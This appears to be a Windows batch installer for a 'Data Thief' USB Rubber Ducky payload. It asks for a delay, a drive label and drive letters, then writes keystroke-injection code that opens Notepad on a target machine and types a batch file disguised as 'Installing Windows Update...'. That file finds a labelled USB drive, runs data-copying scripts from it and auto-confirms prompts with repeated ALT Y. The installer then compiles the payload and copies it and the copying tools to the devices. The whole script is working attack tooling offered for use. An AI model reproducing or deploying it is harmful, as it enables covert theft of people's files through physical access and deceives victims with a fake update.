@echo off
%~d0
CD %~dp0
Title = Data Thief Installer
:Start
@echo Welcome to the Ducky Data Thief Installer!
@echo ------------------------------------------
@echo Lets setup a custom DT payload.
@echo Steps taken to create the payload:
@echo  - Set a startup delay
@echo  - Set what drive to backup data to
@echo  - Set what drive is the Duck
@echo ------------------------------------------
:Step_1
@echo How much of a delay do you want on the startup?
@echo If you are using the "4CAP" firmware, then I recommend leaving this blank.
set delay=
set /p delay=Delay: %=%
if "%delay%"=="0" set delay=
if "%delay%"=="00" set delay=
if "%delay%"=="000" set delay=
if "%delay%"=="0000" set delay=
:Step_2
@echo What is the label of the drive that data will be backed up to?
@echo E.g. JUNK, or DUCKY etc.
set backup_label=
set /p backup_label=Backup Label: %=%
if "%backup_label%"=="" @echo No label specified!
if "%backup_label%"=="" goto Step_2
:Step_3
@echo Make sure the Ducks SD card is mounted. I need to know where to
@echo put the inject.bin.
@echo What drive is the Duck? E.g. E:
call :echo_drive A:
call :echo_drive B:
call :echo_drive D:
call :echo_drive E:
call :echo_drive F:
call :echo_drive G:
call :echo_drive H:
call :echo_drive I:
call :echo_drive J:
call :echo_drive K:
call :echo_drive L:
call :echo_drive M:
call :echo_drive N:
call :echo_drive O:
call :echo_drive P:
call :echo_drive Q:
call :echo_drive R:
call :echo_drive S:
call :echo_drive T:
call :echo_drive U:
call :echo_drive V:
call :echo_drive W:
call :echo_drive X:
call :echo_drive Y:
call :echo_drive Z:
set duck=
set /p duck=Duck: %=%
if "%duck%"=="" @echo Duck not specified!
if "%duck%"=="" goto Step_3
set duck=%duck::=%
set duck=%duck:\=%
if not exist "%duck%:\" @echo Unable to locate "%duck%:\"!
if not exist "%duck%:\" goto Step_3
:Step_4
@echo What drive is the backup device? E.g. F:
@echo Make sure the device where the data will be backed up to is mounted.
@echo This is needed to copy the backup programs.
call :echo_drive A:
call :echo_drive B:
call :echo_drive D:
call :echo_drive E:
call :echo_drive F:
call :echo_drive G:
call :echo_drive H:
call :echo_drive I:
call :echo_drive J:
call :echo_drive K:
call :echo_drive L:
call :echo_drive M:
call :echo_drive N:
call :echo_drive O:
call :echo_drive P:
call :echo_drive Q:
call :echo_drive R:
call :echo_drive S:
call :echo_drive T:
call :echo_drive U:
call :echo_drive V:
call :echo_drive W:
call :echo_drive X:
call :echo_drive Y:
call :echo_drive Z:
set backup_drive_letter=
set /p backup_drive_letter=Drive: %=%
if "%backup_drive_letter%"=="" @echo Drive not specified!
if "%backup_drive_letter%"=="" goto Step_4
set backup_drive_letter=%backup_drive_letter::=%
set backup_drive_letter=%backup_drive_letter:\=%
if not exist "%backup_drive_letter%:\" @echo Unable to locate "%backup_drive_letter%:\"!
if not exist "%backup_drive_letter%:\" goto Step_4
:Final_Check
@echo Install preferences:
@echo --------------------
if not "%delay%"=="" @echo Payload delay: %delay%
if "%delay%"=="" @echo Payload delay: Not defined
@echo Label of backup drive: %backup_label%
@echo Duck: %duck%
@echo Is this configuration correct?
set correct=
set /p correct=Y/N: %=%
if "%correct%"=="Y" goto install
if "%correct%"=="y" goto install
if "%correct%"=="" goto install
@echo Install aborted.
goto Start
:install
@echo Writing payload before installation...
set payload_dir=Scripts\Payloads\Data_Thief_Custom
set compiler_dir=Scripts\Encoders\2.6.3
set compiler=%compiler_dir%\encoder.jar
set compiler_resources=%compiler_dir%\resources
if not exist "%payload_dir%" mkdir "%payload_dir%"
if exist "%payload_dir%\inject.txt" DEL /F "%payload_dir%\inject.txt"
if not "%delay%"=="" @echo DELAY %delay% > "%payload_dir%\inject.txt"
@echo REM Author: Lavanoid Volcanic >> "%payload_dir%\inject.txt"
@echo REM This script supports Windows XP as well as Vista and 7. >> "%payload_dir%\inject.txt"
@echo GUI d >> "%payload_dir%\inject.txt"
@echo DELAY 500 >> "%payload_dir%\inject.txt"
@echo GUI r >> "%payload_dir%\inject.txt"
@echo DELAY 1500 >> "%payload_dir%\inject.txt"
@echo STRING notepad.exe>> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo DELAY 1500 >> "%payload_dir%\inject.txt"
@echo STRING @echo off >> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo STRING Ti>> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo STRING tle = Installing Windows Update... >> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo STRING @echo Installing Windows Update... >> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo STRING set drive=>> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo STRING COLOR F0 >> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo STRING :start>> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo STRING if not "%%LOCALAPPDATA%%"=="" goto win_new>> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
set percent_icon=%%%%
@echo STRING for /f "tokens=3 delims= " %percent_icon%A in ('echo list volume ^^^| diskpart ^^^| findstr "%backup_label%"') do set drive=%percent_icon%A>> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo STRING if "%%drive%%"=="" goto start>> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo STRING set drive=%%drive%%:>> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo STRING %%drive%%>> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo STRING CD "Data">> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo STRING "SCRIPT_EX.bat" "DT.bat">> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo STRING EXIT >> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo STRING :win_new>> "%payload_dir%\inject.txt"
@echo DELAY 400 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo DELAY 400 >> "%payload_dir%\inject.txt"
@echo STRING for /f %percent_icon%d in ('wmic volume get driveletter^^^, label ^^^| findstr "%backup_label%"') do set drive=%percent_icon%d>> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo STRING if "%%drive%%"=="" goto start>> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo STRING %%drive%%>> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo STRING CD "Data">> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo STRING "SCRIPT_EX.bat" "DT.bat">> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo STRING EXIT >> "%payload_dir%\inject.txt"
@echo DELAY 200 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo CTRL S >> "%payload_dir%\inject.txt"
@echo DELAY 1500 >> "%payload_dir%\inject.txt"
@echo STRING %%TEMP%%\DS.bat >> "%payload_dir%\inject.txt"
@echo DELAY 1000 >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo DELAY 600 >> "%payload_dir%\inject.txt"
@echo ALT Y >> "%payload_dir%\inject.txt"
@echo DELAY 700 >> "%payload_dir%\inject.txt"
@echo ALT F4 >> "%payload_dir%\inject.txt"
@echo GUI r >> "%payload_dir%\inject.txt"
@echo DELAY 1500 >> "%payload_dir%\inject.txt"
@echo STRING %%TEMP%%\DS.bat >> "%payload_dir%\inject.txt"
@echo ENTER >> "%payload_dir%\inject.txt"
@echo DELAY 1000 >> "%payload_dir%\inject.txt"
@echo ALT y >> "%payload_dir%\inject.txt"
@echo DELAY 500 >> "%payload_dir%\inject.txt"
@echo ALT y >> "%payload_dir%\inject.txt"
@echo DELAY 500 >> "%payload_dir%\inject.txt"
@echo ALT y >> "%payload_dir%\inject.txt"
@echo DELAY 500 >> "%payload_dir%\inject.txt"
@echo ALT y >> "%payload_dir%\inject.txt"
@echo DELAY 500 >> "%payload_dir%\inject.txt"
@echo ALT y >> "%payload_dir%\inject.txt"
@echo DELAY 500 >> "%payload_dir%\inject.txt"
@echo ALT y >> "%payload_dir%\inject.txt"
@echo DELAY 500 >> "%payload_dir%\inject.txt"
@echo ALT y >> "%payload_dir%\inject.txt"
if exist "%payload_dir%\inject.txt" @echo Successfully wrote "%payload_dir%\inject.txt"!
if not exist "%payload_dir%\inject.txt" @echo Failed to write "%payload_dir%\inject.txt"!
if not exist "%payload_dir%\inject.txt" pause >nul
if not exist "%payload_dir%\inject.txt" goto end
if not exist "%compiler_dir%" @echo Failed to locate "%compiler_dir%"! Cannot compile!
if not exist "%compiler_dir%" pause >nul
if not exist "%compiler_dir%" goto end
if not exist "%compiler%" @echo Failed to locate "%compiler%"! Cannot compile!
if not exist "%compiler%" pause >nul
if not exist "%compiler%" goto end
if not exist "%compiler_resources%" @echo Failed to locate "%compiler_resources%"! Cannot compile!
if not exist "%compiler_resources%" pause >nul
if not exist "%compiler_resources%" goto end
set percent_icon=
CD "%compiler_resources%"
:language_selection
@echo -----------------------------------------------
DIR /B
@echo -----------------------------------------------
@echo Enter the name of the keyboard properties file.
@echo You do not need to include ".properties" but you can if you want to.
set kpropertiesfile=
set /p kpropertiesfile=File: %=%
if "%kpropertiesfile%"=="" @echo No keyboard configuration specified!
if "%kpropertiesfile%"=="" goto language_selection
if not exist "%kpropertiesfile%" set kpropertiesfile=%kpropertiesfile%.properties
if not exist "%kpropertiesfile%" @echo Unable to locate "%kpropertiesfile%"!
if not exist "%kpropertiesfile%" goto language_selection
%~d0
CD %~dp0
if exist "%payload_dir%\inject.bin" @echo Old inject.bin located. Deleting...
if exist "%payload_dir%\inject.bin" DEL /F "%payload_dir%\inject.bin"
if exist "%payload_dir%\inject.bin" @echo Failed to remove "%payload_dir%\inject.bin"!
if exist "%payload_dir%\inject.bin" pause >nul
if exist "%payload_dir%\inject.bin" goto end
@echo Compiling...
java -jar "%compiler%"  -l "%compiler_resources%\%kpropertiesfile%" -i "%payload_dir%\inject.txt" -o "%payload_dir%\inject.bin"
if exist "%payload_dir%\inject.bin" @echo Successfully compiled "%payload_dir%\inject.bin"!
if exist "%payload_dir%\inject.bin" @echo Installing to the duck...
if not exist "%payload_dir%\inject.bin" @echo Failed to compile "%payload_dir%\inject.bin"!
if not exist "%payload_dir%\inject.bin" pause >nul
if not exist "%payload_dir%\inject.bin" goto end
if exist "%duck%:\inject.bin" @echo "inject.bin" found on "%duck%:\" Deleting...
if exist "%duck%:\inject.bin" del /f "%duck%:\inject.bin" >nul
if exist "%duck%:\inject.bin" @echo Failed to remove "%duck%:\inject.bin"!
if exist "%duck%:\inject.bin" pause >nul
if exist "%duck%:\inject.bin" goto end
copy /y /v "%payload_dir%\inject.bin" "%duck%:\inject.bin" >nul
if exist "%duck%:\inject.bin" @echo Successfully installed inject.bin!
if not exist "Data" @echo The directory "Data" does not exist! Cannot install
if not exist "Data" @echo the required data.
if not exist "Data" pause >nul
if not exist "Data" goto end
if not exist "%backup_drive_letter%:\Data" mkdir "%backup_drive_letter%:\Data"
if not exist "%backup_drive_letter%:\Data" @echo Failed to create the directory "%duck%:\Data"!
if not exist "%backup_drive_letter%:\Data" pause >nul
if not exist "%backup_drive_letter%:\Data" goto end
xcopy /Y /E /R "Data" "%backup_drive_letter%:\Data"
@echo Data Thief should now be installed. Lets get quacking!
@echo Press any key to exit
pause >nul
goto end
:echo_drive
if exist "%1\" @echo %1
goto end
:end
